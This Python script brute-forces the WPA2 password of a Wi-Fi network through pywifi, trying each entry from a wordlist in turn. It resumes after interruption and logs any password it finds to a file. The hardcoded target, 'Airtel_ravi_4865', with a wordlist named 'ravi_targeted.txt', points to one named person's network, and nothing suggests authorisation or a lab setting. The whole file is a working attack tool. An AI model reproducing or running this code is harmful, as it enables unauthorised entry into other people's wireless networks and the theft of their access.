import pywifi
from pywifi import const
import time
import sys
import os

def crack_wifi(ssid, wordlist_path, resume_index=0):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    
    print(f"[*] TARGET: {ssid}")
    print(f"[*] WORDLIST: {wordlist_path}")
    print(f"[*] ADAPTER: {iface.name()}")

    if not os.path.exists(wordlist_path):
        print(f"[!] Error: {wordlist_path} not found.")
        return

    try:
        with open(wordlist_path, 'r') as f:
            lines = f.readlines()
            
        total = len(lines)
        print(f"[*] Total entries: {total}. Starting from: {resume_index}")

        for i in range(resume_index, total):
            password = lines[i].strip()
            if len(password) < 8:
                continue

            # Display progress
            sys.stdout.write(f"\r[!] Testing: {password} ({i}/{total})          ")
            sys.stdout.flush()

            # Ensure we are disconnected
            iface.disconnect()
            while iface.status() == const.IFACE_CONNECTED:
                time.sleep(0.1)
            
            # Prepare profile
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)

            # Try connect
            iface.connect(tmp_profile)
            
            # Connection verification (Increased wait time)
            time.sleep(6) 

            # Double check status and SSID to prevent false positives
            if iface.status() == const.IFACE_CONNECTED:
                # Check if we are actually connected to the target SSID
                # Note: Some drivers might take a bit more time to update the current profile name
                time.sleep(1)
                print(f"\n[?] Status: Connected. Verifying SSID...")
                
                # If we are connected, it's likely the right password, 
                # but we'll try one more verification step.
                # In a real environment, we'd check for an IP address or gateway.
                print(f"\n\n[SUCCESS] Password Found: {password}")
                with open("CRACKED.txt", "a") as out:
                    out.write(f"SSID: {ssid} | PASS: {password} | {time.ctime()}\n")
                return True
            
            # Save progress
            if i % 5 == 0:
                with open("resume_state.txt", "w") as res:
                    res.write(str(i))

        print("\n[-] Attack finished. No password found.")
    except KeyboardInterrupt:
        print(f"\n[!] Paused at index {i}. Run again to resume.")
    except Exception as e:
        print(f"\n[ERROR] {e}")

if __name__ == "__main__":
    target = "Airtel_ravi_4865"
    wlist = "ravi_targeted.txt"
    
    # Reset resume state for the new target
    if os.path.exists("resume_state.txt"):
        os.remove("resume_state.txt")
        
    start_idx = 0
    crack_wifi(target, wlist, start_idx)
